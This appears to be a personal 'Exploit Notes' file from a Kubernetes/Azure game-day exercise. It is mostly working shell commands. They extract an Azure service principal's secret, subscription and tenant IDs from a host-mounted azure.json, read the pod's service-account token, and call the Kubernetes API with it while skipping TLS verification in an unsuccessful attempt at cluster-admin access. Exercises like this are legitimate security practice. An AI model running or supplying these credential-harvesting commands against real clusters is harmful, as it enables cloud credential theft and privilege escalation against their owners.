# Exploit Notes

## Host mount
cat /meshconfig/azure.json > azure.json
echo 'Azure SPN: ' $(cat azure.json | jq '. | {s:.subscriptionId, c:.aadClientId, p:.aadClientSecret, t: .tenantId}')




## Without Success: Cluster Admin
./kubectl get pods --server='https://kubernetes.default.svc.cluster.local' --token=$(cat token.txt) --insecure-skip-tls-verify=true


kubectl get pods --server='https://gameday-ex-gameday-rg-a4baed-bb1c2c10.hcp.westeurope.azmk8s.io' --token=$(cat token.txt) --insecure-skip-tls-verify=true


KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods/$HOSTNAME



      $KUBERNETES_SERVICE_PORT = 443


      /var/run/secrets/kubernetes.io/serviceaccount/ca.crt


      --token-auth-file=/var/run/secrets/kubernetes.io/serviceaccount/token 


./kubectl get pods --server='https://10.0.0.1:443' --token=$(cat token.txt) --insecure-skip-tls-verify=true 



# Useful

## New AKS
az aks create -n gameday-exploit-cluster2 -g gameday-rg --generate-ssh-keys --attach-acr gamedayexploitreg
az aks get-credentials -n gameday-exploit-cluster2 -g gameday-rg

## Bash
k exec -it blackboxgameengine-868d84466c-9jmbf --container istio-proxy -- /bin/bash

## Install kubectl
curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x ./kubectl
cat /var/run/secrets/kubernetes.io/serviceaccount/token > token.txt

## JSON Parser
curl -Lo jq "https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64"
chmod +x ./jq
export PATH=$PATH:/app